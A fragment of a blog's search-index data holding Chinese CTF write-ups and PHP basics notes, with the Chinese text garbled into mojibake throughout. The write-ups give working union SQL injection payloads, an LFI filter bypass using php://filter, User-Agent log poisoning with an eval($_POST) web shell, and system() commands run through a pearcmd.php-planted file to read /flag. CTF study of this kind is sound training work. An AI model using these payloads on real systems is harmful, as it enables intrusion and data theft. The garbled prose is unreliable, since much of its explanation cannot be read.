less-33ï¼šå’Œless-32ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº† less-34ï¼šåªæ˜¯ä¼ å‚æ–¹å¼ä»getå˜æˆäº†postè€Œå·²ï¼Œå‰©ä¸‹çš„éƒ½æ²¡æœ‰å˜","tags":["sql"],"categories":["CTF"]},{"title":"è§£é¢˜å¿ƒå¾—","path":"/2023/11/11/è§£é¢˜å¿ƒå¾—_max/è§£é¢˜å¿ƒå¾—/","content":"1.httpï¼ˆæå®¢å¤§æŒ‘æˆ˜ï¼‰é¦–å…ˆæŸ¥çœ‹æºç å‘ç° a style=border:none;cursor:default; onclick=return false href=Secret.phpï¼Œç‚¹å‡»è¯¥é“¾æ¥ ç„¶åé€šè¿‡é¡µé¢ä¿¡æ¯ä¿®æ”¹refererï¼šhttps://Sycsecret.buuoj.cn æ¥ç€æµè§ˆå™¨ä¿¡æ¯ï¼Œå³ User-Agent:Sycloverï¼Œç„¶åå‘Šè¯‰æˆ‘ä»¬è¦ä»æœ¬åœ°æŸ¥çœ‹ï¼Œä¸Šç½‘æŸ¥æ‰¾å‘ç°æœ¬åœ°éƒ½æ˜¯è¿™ä¸ªç«¯å£å· 127.0.0.1ï¼Œä¿®æ”¹xxfï¼Œç„¶åflagå°±å‡ºæ¥äº† 2.æŸ¥çœ‹ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶ï¼ˆæ”»é˜²ä¸–ç•Œï¼‰phpçš„å¤‡ä»½æ–‡ä»¶æœ‰ä¸¤ç§ï¼š*.php~å’Œ*.php.bak ä¾‹å­ï¼šhttp://61.147.171.105:55767/index.php.bak 2.æœºå™¨äººåè®®urlrobots.txt 3.php2ï¼ˆæ”»é˜²ä¸–ç•Œï¼‰å¯¹ç½‘å€åé¢åŠ ä¸Šindex.phpså°±å¯ä»¥æŸ¥çœ‹é¡µé¢phpæºç  ä¾‹å­ï¼šhttp://111.198.29.45:45191/index.phps phpsæ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½æ¥å—ä¼ å‚ï¼Œæ‰€ä»¥hackbarè¿˜æ˜¯è¦åœ¨.phpé‡Œé¢åš 4.cookieï¼ˆæ”»é˜²ä¸–ç•Œï¼‰å¦‚ä½•æŸ¥çœ‹httpå“åº” æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå†ç‚¹å‡»ç½‘ç»œ(network)ï¼Œé€‰æ‹©ä½ æƒ³è¦æŸ¥çœ‹httpå“åº”çš„ç½‘å€ è¿™é“é¢˜çš„flagä½äºæ ‡å¤´é‡Œé¢ 5.æ‰«æç›®å½•ç”¨dirsearchï¼ˆæ”»é˜²ä¸–ç•Œï¼‰dirsearch -u URLæ˜¯è¦æ‰«æçš„ç›®æ ‡ç½‘ç«™çš„URL å¯ä»¥ç”¨ä»¥ä¸‹é€‰é¡¹æ¥è°ƒæ•´æ‰«æï¼š -e:æŒ‡å®šè¦æ’é™¤çš„æ‰©å±•å -f:æŒ‡å®šè¦åŒ…å«çš„æ‰©å±•å -x:æŒ‡å®šè¦æ’é™¤çš„ç›®å½• -t:æŒ‡å®šçº¿ç¨‹æ•° ä¾‹å­ï¼šdirsearch -u https://example.com/ -f php,html -t 50ï¼ˆç”¨50ä¸ªçº¿ç¨‹æ‰«æä¸€ä¸ªURLï¼ŒåªåŒ…æ‹¬.phpå’Œ.htmlæ–‡ä»¶ï¼‰ dirsearch -u https://example.com/ -o result.txt å°†æ‰«æç»“æœä¿å­˜åˆ°result.txtæ–‡ä»¶ä¸­ 6.very_easy_sqli 880æœ¬é¢˜ä½¿ç”¨çš„æ˜¯unionæ³¨å…¥ï¼ˆæ•´å½¢å’Œå­—ç¬¦å‹ï¼‰ æœ€å¼€å§‹é€šè¿‡æŸ¥çœ‹æºä»£ç å‘ç°ä½¿ç”¨çš„æ˜¯post å‰é¢æ³¨å…¥æ­¥éª¤æ¥æŸ¥è¯¢å‡ºæ•°æ®åº“åç§°å«åšez.phpï¼Œè¡¨åå«ä½œusers æ¥ç€é€šè¿‡éœ€è¦æŸ¥å‡ºè¿™ä¸ªè¡¨å†…æœ‰çš„æ‰€æœ‰çš„å­—æ®µåï¼šid,username,password username=222 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=users#password=123 ç„¶åæˆ‘ä»¬éœ€è¦æŸ¥å‡ºè¿™äº›å­—æ®µä¸‹å¾—å†…å®¹ï¼Œæ‰¾å‡ºflagï¼Œè¿™é‡Œé‡‡ç”¨ä¸€åŠ³æ°¸é€¸çš„åšæ³• username=222 union select 1,group_concat(id,username,password),3 from ez_php.users#password=123 æ³¨æ„ï¼šå¿…é¡»ç”¨group_concatæ‰èƒ½æ‰¾å‡ºå­—æ®µä¸‹é¢çš„æ‰€æœ‰å†…å®¹ï¼Œå¦åˆ™åªä¼šæŸ¥è¯¢å‡ºç¬¬ä¸€è¡Œçš„å†…å®¹ 7.ez_double_cmd(phpä¼ªä»£ç åè®®)?phphighlight_file(__FILE__);error_reporting(0);print(easy lfi, but no flag~~);$cmd = $_POST[cmd];//flag in /flagif (isset($cmd)) print (first one: . br); $cmd = preg_replace(/flag/i, , $cmd); echo $cmd; if (preg_match(/flag/i, $cmd)) include($cmd); ï¼ˆ1ï¼‰highlight_file()å‡½æ•° highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚è¯­æ³•é€šè¿‡ä½¿ç”¨ HTML æ ‡ç­¾è¿›è¡Œé«˜äº®ã€‚ æç¤ºï¼šç”¨äºé«˜äº®çš„é¢œè‰²å¯é€šè¿‡ php.ini æ–‡ä»¶è¿›è¡Œè®¾ç½®æˆ–è€…é€šè¿‡è°ƒç”¨ ini_set() å‡½æ•°è¿›è¡Œè®¾ç½®ã€‚ æ³¨é‡Šï¼šå½“ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œæ•´ä¸ªæ–‡ä»¶éƒ½å°†è¢«æ˜¾ç¤ºï¼ŒåŒ…æ‹¬å¯†ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼ è¯­æ³•ï¼š highlight_file(*filename,return*) å‚æ•° æè¿° filename å¿…éœ€ã€‚è§„å®šè¦æ˜¾ç¤ºçš„æ–‡ä»¶ã€‚ return å¯é€‰ã€‚å¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º TRUEï¼Œè¯¥å‡½æ•°å°†ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›é«˜äº®æ˜¾ç¤ºçš„ä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿›è¡Œè¾“å‡ºã€‚é»˜è®¤æ˜¯ FALSEã€‚ ï¼ˆ2ï¼‰preg_replaceå‡½æ•° ä½œç”¨ï¼šæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼æœç´¢å’Œæ›¿æ¢çš„å‡½æ•° åŸºç¡€è¯­æ³•ï¼š preg_replace(pattern, replacement, subject); patternï¼šè¦æœç´¢çš„æ¨¡å¼ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ã€‚ replacementï¼šæ›¿æ¢æ¨¡å¼æˆ–è€…æ›¿æ¢å­—ç¬¦ä¸²ã€‚ subjectï¼šè¦è¿›è¡Œæœç´¢æ›¿æ¢çš„æºå­—ç¬¦ä¸²æˆ–æ•°ç»„ã€‚ è¿™ä¸ªå‡½æ•°ä¼šåœ¨ subject å­—ç¬¦ä¸²ä¸­æœç´¢ä¸ pattern åŒ¹é…çš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨ replacement è¿›è¡Œæ›¿æ¢ã€‚å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰çµæ´»çš„æœç´¢æ¨¡å¼ï¼Œå¹¶å¯¹åŒ¹é…çš„å†…å®¹è¿›è¡Œæ›¿æ¢æˆ–å¤„ç†ã€‚ ï¼ˆ3ï¼‰preg_matchå‡½æ•° ä½œç”¨ï¼šç”¨äºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å‡½æ•°ä¹‹ä¸€ã€‚å®ƒç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åŒ¹é…ã€‚ åŸºç¡€è¯­æ³•ï¼š preg_match(string $pattern, string $subject, array $matches = null, int $flags = 0, int $offset = 0): int|false $pattern æ˜¯è¦åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚ $subject æ˜¯è¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚ $matches æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œç”¨äºå­˜å‚¨åŒ¹é…çš„ç»“æœã€‚ $flags æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šåŒ¹é…æ¨¡å¼ã€‚ $offset æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šå¼€å§‹æœç´¢çš„ä½ç½®åç§»é‡ã€‚ preg_match() è¿”å›æˆåŠŸåŒ¹é…çš„æ¬¡æ•°ï¼ˆé€šå¸¸æ˜¯ 1ï¼‰ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…åˆ°åˆ™è¿”å› 0ï¼Œå¦‚æœå‘ç”Ÿé”™è¯¯åˆ™è¿”å› falseã€‚ $pattern=/flag/i æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚åœ¨è¿™é‡Œï¼Œ/flag/i æ˜¯ä¸€ä¸ªåŒ…å«äº†ä¸¤ä¸ªéƒ¨åˆ†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š /flag/ï¼šè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼éƒ¨åˆ†ã€‚å®ƒè¡¨ç¤ºè¦åŒ¹é…çš„æ–‡æœ¬æ¨¡å¼æ˜¯ â€œflagâ€ã€‚ iï¼šè¿™æ˜¯ä¸€ä¸ªä¿®é¥°ç¬¦ï¼Œç”¨äºä¿®æ”¹æ­£åˆ™è¡¨è¾¾å¼çš„è¡Œä¸ºã€‚åœ¨è¿™é‡Œï¼Œi æ˜¯å¿½ç•¥å¤§å°å†™çš„ä¿®é¥°ç¬¦ï¼Œå®ƒè¡¨ç¤ºåŒ¹é…æ—¶ä¸åŒºåˆ†å­—æ¯çš„å¤§å°å†™ã€‚ æˆ‘ä»¬éœ€è¦ç»è¿‡è¿™ä¸ªå‡½æ•°ååº”è¯¥è¿˜æœ‰flagè¿™ä¸ªè¯ï¼Œæ‰€ä»¥éœ€è¦åŒå†™ç»•è¿‡ï¼Œå³ cmd=flflagagï¼› ç»•è¿‡ä¹‹åå‘ç° include($cmd)æœ¨æœ‰ååº”ï¼Œåé¢ç»è¿‡åœŸè±†å“¥çš„è§£é‡Šæ‰æ˜ç™½æœ‰ååº”ï¼Œåªæ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºä»»ä½•çš„å†…å®¹ å°è¯•ç”¨phpä¼ªåè®®æ¥ç»§ç»­ä½œç­”: cmd=php://filter/read=convert.base64-encode/resource=/flflagag é€šè¿‡è¿™è¡Œä»£ç æˆåŠŸè·å–åˆ°base64ç¼–ç åçš„å†…å®¹ï¼šPD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw== ç»è¿‡base64è§£ç¼–ç åå¾—åˆ° ?php $FLAG = ROISdoudoubleble_cmcmdd_wiwinn; ç”±äºFLAGæ˜¯ä¸€ä¸ªå˜é‡ï¼Œåœ¨æ‰§è¡Œå®Œåä¸ä¼šå†å‰ç«¯æ˜¾ç¤ºä»»ä½•å†…å®¹ è§£æ³•äºŒä¹‹æ—¥å¿—åŒ…å« ä»…é™äºæ—¥å¿—å†…å®¹ä¸å¤šçš„æƒ…å†µä¸‹ï¼Œè¦ä¸ç„¶æ˜¾ç¤ºä¸å‡ºæ¥ é¦–å…ˆå°† User-Agentçš„å†…å®¹æ”¹ä¸ºphpä»£ç  ?php eval($_POST[kang]);? æ¥ç€POSTä¼ å‚å†…å®¹ä¸º cmd=flflagag/../../../../../../../var/log/apache2/access.logkang=system(cat /flag|base64) è¦æœ‰ç©ºæ ¼ æœ€åå°±å¯ä»¥å¾—åˆ°base64ç¼–ç åçš„flagï¼Œè§£ç åå°±å¾—åˆ°äº†flagçš„å†…å®¹ 8.double_cmd_pluså‰æ–‡Linuxä¸Šæ‰§è¡ŒæŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„æ–¹å¼æ˜¯ï¼šæ–‡ä»¶åeg:æ‰§è¡Œå½“å‰ç›®å½•ä¸‹ä¸€ä¸ªhello.shï¼š.hello.sh å…¶å®åªè¦æŒ‡å®šäº†ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„éƒ½èƒ½ç›´æ¥æ“æ§çš„ flagæ–‡ä»¶åŠ äº†0600æƒé™ï¼šæ„å‘³ç€åªæœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…å…·æœ‰è¯»å–å’Œå†™å…¥æƒé™ï¼Œè€Œå…¶ä»–ç”¨æˆ·ï¼ˆç»„æˆå‘˜å’Œå…¶ä»–ç”¨æˆ·ï¼‰æ²¡æœ‰ä»»ä½•æƒé™ cæ–‡ä»¶ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶åŠ äº†u+sæƒé™ï¼šæ„å‘³ç€å½“ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå°†ä¸´æ—¶ä½¿ç”¨æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ‰§è¡Œç”¨æˆ·çš„æƒé™ã€‚ Cæ–‡ä»¶ï¼ˆreadflag.cï¼‰ä¸­çš„ä»£ç å¦‚ä¸‹ï¼š int main(void) char flag[256] = 0; FILE* fp = fopen(/flag, r); if (!fp) perror(fopen); return 1; if (fread(flag, 1, 256, fp) 0) perror(fread); return 1; puts(flag); fclose(fp); return 0; è¿™æ®µä»£ç å°è¯•æ‰“å¼€åä¸º â€œflagâ€ çš„æ–‡ä»¶ï¼Œè¯»å–å…¶å†…å®¹å¹¶å°†å…¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚å¦‚æœæ‰“å¼€æˆ–è¯»å–æ–‡ä»¶å¤±è´¥ï¼Œç¨‹åºä¼šæ‰“å°ç›¸åº”çš„é”™è¯¯æ¶ˆæ¯å¹¶é€€å‡º é¢˜ç›®ä»£ç å¦‚ä¸‹ ?phphighlight_file(__FILE__);error_reporting(0);print (easy lfi, but no flag~~);$cmd = $_POST[cmd];//flag in /flagif (isset($cmd)) print (first one: . br); $cmd = preg_replace(/flag/i, , $cmd); echo $cmd; if (preg_match(/flag/i, $cmd)) include($cmd); åšé¢˜è¿‡ç¨‹é¦–å…ˆæˆ‘ä»¬éœ€è¦åŒ…å«pearcmd.phpæ–‡ä»¶æ‰èƒ½å¤Ÿè¿›è¡Œä¸‹ä¸€æ­¥ï¼Œå³åˆ©ç”¨pearcmd.phpçš„æ¼æ´æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ˆè¦ç”¨bpæ¥æ“ä½œï¼Œåœ¨é‡æ”¾å™¨é‡Œé¢ï¼‰ æˆåŠŸæ’å…¥æ–‡ä»¶ä¹‹åæˆ‘ä»¬å°±è½¬æˆ˜hackbar é€šè¿‡ cmd=flflagag../../../../../../tmp/hack.phpkang=system(ls /);æˆ‘ä»¬å¯ä»¥çŸ¥é“readflagæ–‡ä»¶ï¼ˆç¼–è¯‘åçš„æ–‡ä»¶ï¼‰ä½äºæ ¹ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€€åˆ°æ ¹ç›®å½•å¤„å»æ‰§è¡Œï¼Œå³ cmd=flflagag../../../../../../tmp/hack.phpkang=system(../../../../.././readflag); è¿™æ ·å­å‘ç°æ²¡æœ‰ä»»ä½•å†…å®¹æ˜¾ç¤ºï¼ŒæŸ¥çœ‹flagæ–‡ä»¶ä»£ç åå‘ç°æ˜¯å› ä¸ºphpå˜é‡ä¸ä¼šè¢«ç›´æ¥æ˜¾ç¤ºåœ¨å‰ç«¯ï¼Œäºæ˜¯å°è¯•å¯¹å…¶è¿›è¡Œbase64ç¼–ç  cmd=flflagag../../../../../../tmp/hack.phpkang=system(../../../../.././readflag|base64); cmd=flflagag../../../../../../tmp/hack.phpkang=system(../../../../../readflag|base64);ï¼ˆè¿™æ ·ä¹Ÿå¯ä»¥çš„ï¼‰ æˆåŠŸæ˜¾ç¤ºå‡ºç¼–ç åçš„flagæ–‡ä»¶å†…å®¹ï¼Œæ‹¿å»è§£ç åå¾—åˆ°flag ?php$FLAG = ROISlfitoshellissoeasy; ï¼ˆå…¶å®æœ€å¼€å§‹åšçš„æ—¶å€™ç”¨è¿™ä¸ªæ–¹æ³•æ€ä¹ˆéƒ½æ˜¯è¡Œä¸é€šçš„ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥æ™šä¸Šå†è¯•ä¸€æ¬¡å°±æˆåŠŸäº†ï¼‰ å†ç»è¿‡äº†è±†å“¥çš„æç¤ºåæ˜ç™½å½“çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„çš„æ—¶å€™ä¾¿å¯ä»¥ç›´æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æœ‰ä¸‹é¢ç¬¬äºŒç§æ–¹å¼å¾—åˆ°flag cmd=flflagag../../../../../../tmp/hack.phpkang=system(/readflag|base64); ç»“è¯­è¿™é“é¢˜èƒ½å¤Ÿåšå‡ºæ¥è¿˜æ˜¯è¦æ„Ÿè°¢åœŸè±†ç²‰å’ŒåœŸè±†å“¥ï¼Œå¯¹æˆ‘è§£å†³è¿™é“é¢˜çš„å¸®åŠ©å¤ªå¤§äº† åšçš„æ—¶å€™å¯¹pearcmd.phpæ¼æ´çš„ç†è§£è¿˜æ˜¯ä¸å¤ªæ·±åˆ»ï¼Œå¯¹äºbpçš„ä½¿ç”¨ä¹Ÿä¸ç†Ÿï¼Œå¯¼è‡´æœ€å¼€å§‹çš„æ—¶å€™æµªè´¹äº†å¾ˆå¤šçš„æ—¶é—´ã€‚ è¿™é“é¢˜ç»¼åˆèƒ½åŠ›éå¸¸å¼ºï¼Œä»¥å‰ç”¨åˆ°çš„çŸ¥è¯†ç‚¹å¥½å¤šéƒ½åˆç”¨ä¸Šäº† 9.easy-PDDï¼ˆçˆ†ç ´ï¼‰è¿™é“é¢˜å…ˆç”¨bpæŠ“åŒ…ï¼Œç„¶åç”¨bpä¸­çš„çˆ†ç ´æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯Intruderæ¨¡å¼æ¥å‘é€å¥½å¤šå¥½å¤šçš„è¯·æ±‚åŒ…ï¼Œå¾—åˆ°flag å…·ä½“çˆ†ç ´æ¨¡å¼æ“ä½œæ­¥éª¤å¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/FTQOOO/article/details/103822526 10.æºç æ³„éœ²urlwww.zipï¼šä¼šä¸‹è½½ç›¸å…³æºç  11.ä¿¡æ¯æ³„éœ²ï¼ˆæ€»ï¼‰èµ„æ–™æŸ¥çœ‹ç½‘å€ï¼šhttps://blog.csdn.net/a597934448/article/details/105431367 12.Vimæ„å¤–é€€å‡ºä¸´æ—¶æ–‡ä»¶æ˜¯åœ¨vimç¼–è¾‘æ–‡æœ¬æ—¶å°±ä¼šåˆ›å»ºçš„æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ ä»¥ index.php ä¸ºä¾‹ ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åä¸º .index.php.swpç¬¬äºŒæ¬¡æ„å¤–é€€å‡ºåï¼Œæ–‡ä»¶åä¸º.index.php.swoç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åˆ™ä¸º .index.php.swnæ³¨æ„ï¼šindexå‰æœ‰ â€œ . â€œ","categories":["Write-Up"]},{"title":"php","path":"/2023/10/28/php/php/","content":"phpåŸºç¡€phpå˜é‡PHP å˜é‡è§„åˆ™ï¼š å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§° å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹ å˜é‡ååªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰ å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼ å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼ˆ$y å’Œ $Y æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼‰ ï¼ˆæ³¨æ„ï¼šphpå˜é‡å’Œphpè¯­å¥éƒ½æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼‰ PHP æ²¡æœ‰å£°æ˜å˜é‡çš„å‘½ä»¤ï¼Œå˜é‡åœ¨æ‚¨ç¬¬ä¸€æ¬¡èµ‹å€¼ç»™å®ƒçš„æ—¶å€™è¢«åˆ›å»º phpæœ‰å››ç§ä¸åŒçš„å˜é‡ä½œç”¨åŸŸï¼šlocal,global,static,parameterã€‚ å±€éƒ¨å’Œå…¨å±€ä½œç”¨åŸŸï¼šåœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸã€‚é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œè¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ global å…³é”®å­—ã€‚åœ¨ PHP å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»…èƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ã€‚ php globalå…³é”®å­— staticä½œç”¨åŸŸ å½“ä¸€ä¸ªå‡½æ•°å®Œæˆæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡é€šå¸¸éƒ½ä¼šè¢«åˆ é™¤ã€‚ç„¶è€Œï¼Œæœ‰æ—¶å€™æ‚¨å¸Œæœ›æŸä¸ªå±€éƒ¨å˜é‡ä¸è¦è¢«åˆ é™¤ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œè¯·åœ¨æ‚¨ç¬¬ä¸€æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨ static å…³é”®å­— phpçš„echo,printecho å’Œ print åŒºåˆ«ï¼š echo - å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸² print - åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º 1 æç¤ºï¼šecho è¾“å‡ºçš„é€Ÿåº¦æ¯” print å¿«ï¼Œ echo æ²¡æœ‰è¿”å›å€¼ï¼Œprintæœ‰è¿”å›å€¼1 php EOF(heredoc)ä½¿ç”¨è¯´æ˜PHP EOF(heredoc)æ˜¯ä¸€ç§åœ¨å‘½ä»¤è¡Œshellï¼ˆå¦‚shã€cshã€kshã€bashã€PowerShellå’Œzshï¼‰å’Œç¨‹åºè¯­è¨€ï¼ˆåƒPerlã€PHPã€Pythonå’ŒRubyï¼‰é‡Œå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚ ä½¿ç”¨æ¦‚è¿°ï¼š å¿…é¡»åæ¥åˆ†å·ï¼Œå¦åˆ™ç¼–è¯‘é€šä¸è¿‡ã€‚ EOF å¯ä»¥ç”¨ä»»æ„å…¶å®ƒå­—ç¬¦ä»£æ›¿ï¼Œåªéœ€ä¿è¯ç»“æŸæ ‡è¯†ä¸å¼€å§‹æ ‡è¯†ä¸€è‡´ã€‚ 3. ç»“æŸæ ‡è¯†å¿…é¡»é¡¶æ ¼ç‹¬è‡ªå ä¸€è¡Œ(å³å¿…é¡»ä»è¡Œé¦–å¼€å§‹ï¼Œå‰åä¸èƒ½è¡”æ¥ä»»ä½•ç©ºç™½å’Œå­—ç¬¦)ã€‚ å¼€å§‹æ ‡è¯†å¯ä»¥ä¸å¸¦å¼•å·æˆ–å¸¦å•åŒå¼•å·ï¼Œä¸å¸¦å¼•å·ä¸å¸¦åŒå¼•å·æ•ˆæœä¸€è‡´ï¼Œè§£é‡Šå†…åµŒçš„å˜é‡å’Œè½¬ä¹‰ç¬¦å·ï¼Œå¸¦å•å¼•å·åˆ™ä¸è§£é‡Šå†…åµŒçš„å˜é‡å’Œè½¬ä¹‰ç¬¦å·ã€‚ å½“å†…å®¹éœ€è¦å†…åµŒå¼•å·ï¼ˆå•å¼•å·æˆ–åŒå¼•å·ï¼‰æ—¶ï¼Œä¸éœ€è¦åŠ è½¬ä¹‰ç¬¦ï¼Œæœ¬èº«å¯¹å•åŒå¼•å·è½¬ä¹‰ï¼Œæ­¤å¤„ç›¸å½“ä¸qå’Œqqçš„ç”¨æ³•ã€‚ phpæ•°æ®ç±»å‹phpå­—ç¬¦ä¸²ï¼ˆstring) ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸€ä¸²å­—ç¬¦çš„åºåˆ—ï¼Œå°±åƒ â€œHello world!â€ã€‚ä½ å¯ä»¥å°†ä»»ä½•æ–‡æœ¬æ”¾åœ¨å•å¼•å·å’ŒåŒå¼•å·ä¸­ phpæ•´å‹ï¼ˆinteger) æ•´æ•°è§„åˆ™ï¼šæ•´æ•°å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªæ•°å­— (0-9)ï¼›æ•´æ•°ä¸èƒ½åŒ…å«é€—å·æˆ–ç©ºæ ¼ï¼›æ•´æ•°æ˜¯æ²¡æœ‰å°æ•°ç‚¹çš„ï¼›æ•´æ•°å¯ä»¥æ˜¯æ­£æ•°æˆ–è´Ÿæ•°ï¼›æ•´å‹å¯ä»¥ç”¨ä¸‰ç§æ ¼å¼æ¥æŒ‡å®šï¼šåè¿›åˆ¶ï¼Œ åå…­è¿›åˆ¶ï¼ˆ ä»¥ 0x ä¸ºå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆå‰ç¼€ä¸º 0ï¼‰ phpæµ®ç‚¹å‹ï¼ˆfloatï¼‰ å³å¸¦å°æ•°éƒ¨åˆ†çš„æ•°å­—æˆ–æ˜¯æŒ‡æ•°å½¢å¼ var_dump( )å‡½æ•°è¿”å›å˜é‡çš„æ•°æ®ç±»å‹å’Œå€¼ phpå¸ƒå°”å‹ï¼ˆbooleanï¼‰ å¸ƒå°”å‹å¯ä»¥æ˜¯trueæˆ–falseï¼Œé€šå¸¸ç”¨äºæ¡ä»¶åˆ¤æ–­ phpæ•°ç»„ï¼ˆaarrayï¼‰ å¯ä»¥ä¸€ä¸ªå˜é‡å‚¨å­˜å¤šä¸ªå€¼ ?php $cars=array(Volvo,BMW,Toyota);var_dump($cars);? phpå¯¹è±¡ï¼ˆobjectï¼‰ php nullå€¼ NULL å€¼è¡¨ç¤ºå˜é‡æ²¡æœ‰å€¼ã€‚NULL æ˜¯æ•°æ®ç±»å‹ä¸º NULL çš„å€¼ã€‚ NULL å€¼æŒ‡æ˜ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºå€¼ã€‚ åŒæ ·å¯ç”¨äºæ•°æ®ç©ºå€¼å’ŒNULLå€¼çš„åŒºåˆ«ã€‚ ä¾‹å­ï¼šå¯ä»¥é€šè¿‡è®¾ç½®å˜é‡å€¼ä¸º NULL æ¥æ¸…ç©ºå˜é‡æ•°æ®ï¼š ?php$x=Hello world!;$x=null;var_dump($x);? phpèµ„æºç±»å‹ï¼ˆresourceï¼‰ PHP èµ„æº resource æ˜¯ä¸€ç§ç‰¹æ®Šå˜é‡ï¼Œä¿å­˜äº†åˆ°å¤–éƒ¨èµ„æºçš„ä¸€ä¸ªå¼•ç”¨ã€‚å¸¸è§èµ„æºæ•°æ®ç±»å‹æœ‰æ‰“å¼€æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€å›¾å½¢ç”»å¸ƒåŒºåŸŸç­‰ã€‚ 